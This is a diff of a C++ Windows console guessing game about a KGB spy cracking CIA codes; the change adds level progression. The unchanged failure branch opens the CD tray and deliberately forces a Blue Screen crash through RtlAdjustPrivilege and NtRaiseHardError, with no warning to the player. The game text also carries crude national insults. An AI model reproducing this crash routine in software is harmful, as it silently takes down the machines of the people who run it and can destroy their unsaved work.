@@ -32,23 +32,23 @@ void PrintIntroduction()
 	cout << "On one side we have the proud and glorious motherland, also know as the URSS.\n";
 	cout << "On the other side we have the illiterate, dirty and greedy american pigs.\n";
 	cout << "Who wins this war will be the most powerfull and influential country in the world.\n";
-
+	cout << "You are agent 13, a KGB spy secretly infiltrated in the CIA HQ.\n";
+	cout << "You need to find the correct security codes to bypass the security systems and steal the secret CIA projects to send them to our motherland.\n";
 	PlaySound(L"MainMusic.wav", NULL, SND_ASYNC | SND_LOOP);
 
 }
 
-void PrintKGBIntro()
+void PrintKGBIntro(int Difficulty)
 {
-	cout << "You are agent 13, a KGB spy secretly infiltrated in the CIA HQ.\n";
-	cout << "You need to find the correct security codes to bypass the security systems and steal the secret CIA projects to send them to our motherland.\n";
+	cout << "Infiltration Progress ( "<< Difficulty <<  " /13).\n";
 	
 
 }
 
-bool PlayGame()
+bool PlayGame(int Difficulty)
 {
 
-	PrintKGBIntro();
+	PrintKGBIntro(Difficulty);
 
 	//declare the 3 number code
 	const int CodeA = 4;
@@ -78,8 +78,9 @@ bool PlayGame()
 	int GuessSum = GuessA + GuessB + GuessC;
 	int GuessProduct = GuessA * GuessB * GuessC;
 
+	
 	//Check if player guess is correct
-	if (GuessSum == CodeSum && GuessProduct == CodeProduct)
+	if (Difficulty>=13)
 	{
 		cout << "\nGood my comrade, you did a great job for the motherland!\n";
 		SetConsoleTextAttribute(hConsole, 12);
@@ -127,16 +128,19 @@ bool PlayGame()
 
 	}
 
+	else if (GuessSum == CodeSum && GuessProduct == CodeProduct)
+	{
+		cout << "Good work comrade, keep going. \n";
+		return true;
+	}
 	else
 	{
-		
 		SetConsoleTextAttribute(hConsole,12);
 		for (int k = 1; k < 100; k++)
 		{
 			cout << "\nCyka blyat comrade, you entered the wrong code and doomed us all!!!!";
 		}
 		
-
 		mciSendString(L"set cdaudio door open", NULL, NULL, NULL);
 		//Sleep(5000);
 		//SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
@@ -144,39 +148,35 @@ bool PlayGame()
 		//SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
 		//Sleep(3000);
 
-
 		//BSOD
 		BOOLEAN bl;
 		unsigned long response;
 		RtlAdjustPrivilege(19, true, false, &bl);
 		NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
-
 		return false;
-
 	}
-
-	
-
 }
-
 
 
 int main()
 {
-
+	int LevelDifficulty = 1;
 
 	PrintIntroduction();
 
-
+	
 	while (true)
 	{
-		bool bLevelComplete = PlayGame();
+	
+		bool bLevelComplete = PlayGame(LevelDifficulty);
 		cin.clear();
 		cin.ignore();
+
+		if (bLevelComplete)
+		{
+			++LevelDifficulty;
+		}
 	}
-
-	
-
 	return 0;
 }
 
